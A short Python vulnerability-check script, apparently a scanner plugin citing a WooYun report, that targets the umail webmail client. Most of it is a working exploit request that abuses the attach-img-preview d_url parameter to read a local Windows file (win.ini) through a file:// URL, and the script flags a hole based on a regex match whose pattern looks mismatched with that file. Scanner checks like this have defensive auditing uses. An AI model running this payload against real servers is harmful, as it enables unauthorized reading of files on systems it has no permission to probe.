#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Reference  :  http://www.wooyun.org/bugs/wooyun-2010-085810
"""

import  re

def assign(service, arg):
    if service == "umail":
        return True, arg

def audit(arg):
    url = arg
    payload = 'module=operate&action=attach-img-preview&d_url=file://C:\windows\win.ini&type=text/htm'
    verify_url = url + '/webmail/client/mail/index.php?%s' % payload
    code, head, res, errcode, _ = curl.curl(verify_url)
    reg = re.compile("webdb\['mymd5'\]")
    if reg.findall(res):
        security_hole(verify_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign("umail", 'http://www.example.com/')[1])
